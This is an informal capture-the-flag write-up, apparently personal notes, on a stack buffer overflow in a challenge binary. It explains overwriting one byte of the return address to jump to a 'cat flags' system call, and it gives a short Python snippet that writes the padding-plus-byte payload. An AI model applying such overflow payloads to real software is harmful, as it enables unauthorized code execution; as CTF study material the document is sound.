we have char buffer of size 40

we can write 57 bytes into it

![[Pasted image 20230618105654.png]]

57 th byte overwrites the last byte in return address, so we jump just before the system call for `cat flags` so we get the flag

```
>>> with open('pay', 'wb') as f:
...     f.write("2\n".encode())
...     f.write((b"A" * 85) + b'\x12')
```

![[Pasted image 20230618105814.png]]

but we need to write 85 input keys, we will only write 57 bytes in the read call but, for some ready some extro key strokes are getting used before that

if we use python pwn to connect with socket directly and send the input, we only ahve to send 56 + offset

